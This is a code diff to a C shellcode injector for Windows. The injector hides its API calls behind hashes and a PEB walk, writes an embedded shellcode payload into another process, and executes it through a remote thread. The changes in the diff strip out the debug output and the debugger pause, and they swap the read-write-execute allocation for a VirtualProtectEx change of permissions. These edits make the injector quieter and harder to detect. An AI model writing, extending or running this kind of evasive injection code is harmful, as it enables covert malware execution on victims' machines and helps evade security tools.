@@ -51,12 +51,14 @@ DWORD HashString(const char* str) {
 #define HASH_OPENPROCESS        0x7136FDD6
 #define HASH_VIRTUALALLOCEX     0xF36E5AB4
 #define HASH_WRITEPROCESSMEMORY 0x6F22E8C8
+#define HASH_VIRTUALPROTECTEX   0xD812922A
 #define HASH_CREATEREMOTETHREAD 0xAA30775D
 
 // Function Pointer Prototypes
 typedef HANDLE(WINAPI* pfnOpenProcess)(DWORD, BOOL, DWORD);
 typedef LPVOID(WINAPI* pfnVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
 typedef BOOL(WINAPI* pfnWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
+typedef BOOL(WINAPI* pfnVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
 typedef HANDLE(WINAPI* pfnCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
 
 // 2. Custom PEB Walk for kernel32.dll Base Address
@@ -122,29 +124,25 @@ int main(void) {
 
     HMODULE hKernel32 = GetKernel32Base();
     if (!hKernel32) {
-        printf("[-] Failed to locate kernel32.dll base from PEB!\n");
         return -1;
     }
 
     pfnOpenProcess myOpenProcess = (pfnOpenProcess)GetProcAddressByHash(hKernel32, HASH_OPENPROCESS);
     pfnVirtualAllocEx myVirtualAllocEx = (pfnVirtualAllocEx)GetProcAddressByHash(hKernel32, HASH_VIRTUALALLOCEX);
     pfnWriteProcessMemory myWriteProcessMemory = (pfnWriteProcessMemory)GetProcAddressByHash(hKernel32, HASH_WRITEPROCESSMEMORY);
+    pfnVirtualProtectEx myVirtualProtectEx = (pfnVirtualProtectEx)GetProcAddressByHash(hKernel32, HASH_VIRTUALPROTECTEX);
     pfnCreateRemoteThread myCreateRemoteThread = (pfnCreateRemoteThread)GetProcAddressByHash(hKernel32, HASH_CREATEREMOTETHREAD);
 
     if (!myOpenProcess || !myVirtualAllocEx || !myWriteProcessMemory || !myCreateRemoteThread) {
-        printf("[-] Failed to resolve API hashes!\n");
         return -1;
     }
 
-    printf("[+] API Hashes Resolved Successfully.\n");
 
     // Full Process Access (0x001F0FFF) to allow execution & thread creation
     HANDLE hProcess = myOpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
     if (!hProcess) {
-        printf("[-] OpenProcess failed! Error: %lu\n", GetLastError());
         return -1;
     }
-    printf("[+] OpenProcess Successful! Handle: 0x%p\n", hProcess);
 
     unsigned char shellcode[] = {"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
 "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
@@ -169,36 +167,27 @@ int main(void) {
     SIZE_T shellcodeSize = sizeof(shellcode);
 
     // Allocate Remote Executable Memory (PAGE_EXECUTE_READWRITE = 0x40)
-    LPVOID pRemoteMem = myVirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID pRemoteMem = myVirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!pRemoteMem) {
-        printf("[-] VirtualAllocEx failed! Error: %lu\n", GetLastError());
         CloseHandle(hProcess);
         return -1;
     }
-    printf("[+] Remote Executable Memory Allocated at: 0x%p\n", pRemoteMem);
 
     // Write Shellcode to Remote Process
     SIZE_T bytesWritten = 0;
     BOOL bWritten = myWriteProcessMemory(hProcess, pRemoteMem, shellcode, shellcodeSize, &bytesWritten);
     if (!bWritten) {
-        printf("[-] WriteProcessMemory failed! Error: %lu\n", GetLastError());
         CloseHandle(hProcess);
         return -1;
     }
-    printf("[+] Shellcode written successfully (%zu bytes)!\n", bytesWritten);
 
-    // === DEBUG PAUSE FOR x64dbg ATTACH ===
-    printf("\n[!] PAUSED: Go to x64dbg -> File -> Attach -> Select PID %lu (Notepad)\n", targetPID);
-    printf("[!] Go to Address 0x%p in x64dbg Memory Map/Disassembly and Set Breakpoint (F2)!\n", pRemoteMem);
-    printf("[!] Press ENTER in this console to trigger CreateRemoteThread...\n");
-    getchar(); getchar();
+    DWORD dwOldProtect = 0;
+    myVirtualProtectEx(hProcess, pRemoteMem, shellcodeSize, PAGE_EXECUTE_READ, &dwOldProtect);
 
     // Trigger Execution via Remote Thread
     HANDLE hThread = myCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteMem, NULL, 0, NULL);
     if (!hThread) {
-        printf("[-] CreateRemoteThread failed! Error: %lu\n", GetLastError());
     } else {
-        printf("[+] CreateRemoteThread Triggered! Thread Handle: 0x%p\n", hThread);
         CloseHandle(hThread);
     }
 
